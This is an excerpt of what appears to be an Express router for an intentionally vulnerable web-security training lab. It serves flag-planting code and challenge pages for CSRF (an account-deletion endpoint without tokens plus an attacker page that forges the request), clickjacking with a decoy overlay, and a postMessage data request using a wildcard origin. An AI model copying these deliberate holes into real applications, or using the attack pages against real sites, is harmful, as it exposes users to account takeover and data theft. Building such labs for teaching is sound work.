...
const getFlag = (subdir, filename) => {
  const flagStr = process.env.FLAG || `FLAG{${subdir.toUpperCase()}_${filename.replace('.txt', '').toUpperCase()}_LOCAL}`;
  try {
    const fsLib = require('fs');
    fsLib.writeFileSync('/tmp/flag.txt', flagStr);
    fsLib.writeFileSync('/app/pwned_flag.txt', flagStr);
    console.log('[PWNED] Flag dynamically planted in volume at /app/pwned_flag.txt');
  } catch(e) {}
  return flagStr;
};
  ...
  res.send(`
    ...
    <head>
      ...
      <style>
        ...
        form, .comment { border: 1px solid #ddd; border-radius: 12px; padding: 16px; margin-bottom: 16px; }
...
router.get('/csrf/silver', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      ...
      <style>
        ...
        pre { background: #f7f7f7; padding: 14px; overflow: auto; }
      </style>
    </head>
    <body>
      <div class="card">
        <h1>Delete Account</h1>
        <p>This is the victim account page. It accepts cross-site JSON requests without a CSRF token.</p>
        <button onclick="fetch('/csrf/silver',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'delete-account'})}).then(r=>r.text()).then(t=>document.getElementById('out').textContent=t)">Delete</button>
      </div>
      <div class="card">
        <h2>Attacker PoC</h2>
        <pre>&lt;script&gt;
...
router.get('/csrf/silver/attacker', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      ...
      <style>
        body { font-family: Arial, sans-serif; max-width: 720px; margin: 40px auto; padding: 0 20px; }
        .card { border: 1px solid #ddd; border-radius: 12px; padding: 20px; margin-bottom: 20px; }
        iframe { width: 100%; height: 320px; border: 1px solid #ccc; }
      </style>
    </head>
    <body>
      <div class="card">
        <h1>Attacker-Controlled Page</h1>
        <p>This page embeds the victim flow and fires the forged JSON request.</p>
        <button onclick="fetch('/csrf/silver',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'delete-account'})}).then(r=>r.text()).then(t=>document.getElementById('result').textContent=t)">Launch CSRF</button>
        <pre id="result">Waiting...</pre>
      </div>
      <iframe src="/csrf/silver"></iframe>
    </body>
    </html>
  `);
});
...
router.get('/clickjack/silver', (req, res) => {
  ...
  res.send(`
    ...
    <body>
      ...
      <p>This page claims to limit framing to a trusted origin.</p>
...
router.get('/clickjack/silver/attack', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Trusted Portal</title>
      <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 24px; }
        .frame-wrap { position: relative; width: 640px; height: 360px; }
        iframe { width: 100%; height: 100%; opacity: 0.65; }
        .decoy { position: absolute; inset: 0; display: flex; align-items: center; justify-content: center; pointer-events: none; font-size: 32px; font-weight: 700; }
      </style>
    </head>
    <body>
      <h1>Rewards Claim</h1>
      <p>Frame the target and align a decoy CTA over the real action.</p>
      <div class="frame-wrap">
        <iframe src="/clickjack/silver"></iframe>
        <div class="decoy">Click To Claim Bonus</div>
      </div>
    </body>
    </html>
  `);
...
router.get('/postmsg/silver/attacker', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      ...
      <style>
        ...
        iframe { width: 100%; height: 280px; border: 1px solid #ccc; }
        pre { background: #f7f7f7; padding: 16px; min-height: 80px; }
      </style>
    </head>
    <body>
      <h1>Embedded Support Widget</h1>
      <iframe id="victim" src="/postmsg/silver"></iframe>
      <p><button onclick="document.getElementById('victim').contentWindow.postMessage('getUserData','*')">Request Data</button></p>
